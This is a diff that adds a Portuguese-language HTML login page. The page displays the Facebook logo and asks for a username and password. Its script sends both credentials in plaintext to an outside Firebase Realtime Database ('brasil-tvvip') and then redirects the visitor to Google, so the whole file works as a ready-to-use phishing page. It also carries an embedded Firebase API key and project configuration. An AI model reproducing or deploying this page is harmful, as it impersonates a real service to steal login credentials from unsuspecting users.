@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Página de Login</title>
+  <style>
+    body {
+      margin: 10;
+      padding: 10;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #1a237e, #2196F3);
+      display: flex;
+      justify-content: center top;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .login-container {
+      margin-top: 0px; /* Adiciona um espaçamento entre a imagem e o formulário */
+      background-color: #0d47a1;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      width: 300px;
+    }
+
+    .login-container label,
+    .login-container input[type="text"],
+    .login-container input[type="password"],
+    .login-container input[type="submit"] {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .login-container label {
+      color: #fff;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"],
+    .login-container input[type="submit"] {
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #1a237e;
+      color: #fff;
+      box-sizing: border-box;
+    }
+
+    .login-container input[type="submit"] {
+      cursor: pointer;
+      background-color: #42a5f5;
+      transition: background-color 0.2s ease;
+    }
+
+    .login-container input[type="submit"]:hover {
+      background-color: #1976d2;
+    }
+
+    /* Estilos para o contêiner que envolve a imagem e o formulário */
+    .top-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 400px;
+      margin-top: 0; /* Remove qualquer espaçamento superior */
+    }
+
+    /* Estilos para a imagem no topo da página */
+    .logo-image {
+      max-width: 200px;
+      margin-top: 0; /* Remove qualquer espaçamento superior */
+    }
+  </style>
+</head>
+<body>
+  <div class="top-container">
+    <a href="https://www.google.com">
+      <img class="logo-image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" alt="Logo">
+    </a>
+    <div class="login-container">
+      <form id="login-form">
+        <label for="username">Usuário:</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">Senha:</label>
+        <input type="password" id="password" name="password" required>
+
+        <input type="submit" value="Entrar">
+      </form>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // Configurações específicas do seu projeto Firebase
+    var firebaseConfig = {
+      apiKey: "AIzaSyDMK4U8V3Gtc37wEKg1S8zqRAqoRBnqiqA",
+      authDomain: "brasil-tvvip.firebaseapp.com",
+      databaseURL: "https://brasil-tvvip-default-rtdb.firebaseio.com",
+      projectId: "brasil-tvvip",
+      storageBucket: "gs://brasil-tvvip.appspot.com",
+      messagingSenderId: "677145205938",
+      appId: "1:677145205938:android:25d65efacd550e900fbdab"
+    };
+
+    // Inicializar o Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Obter referência para o formulário de login
+    var loginForm = document.getElementById("login-form");
+
+    // Adicionar um ouvinte para o evento de envio do formulário
+    loginForm.addEventListener("submit", function (event) {
+      event.preventDefault(); // Impedir o envio padrão do formulário
+
+      var username = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
+
+      // Enviar informações do formulário para o Firebase Realtime Database
+      var database = firebase.database();
+      var usersRef = database.ref("users"); // Referência para o nó "users"
+      usersRef.push({
+        username: username,
+        password: password
+        // Outras informações que você deseja armazenar no banco de dados
+      });
+
+      // Redirecionar o usuário para o Google após o envio bem-sucedido
+      window.location.href = "https://google.com.br";
+    });
+  </script>
+</body>
+</html>
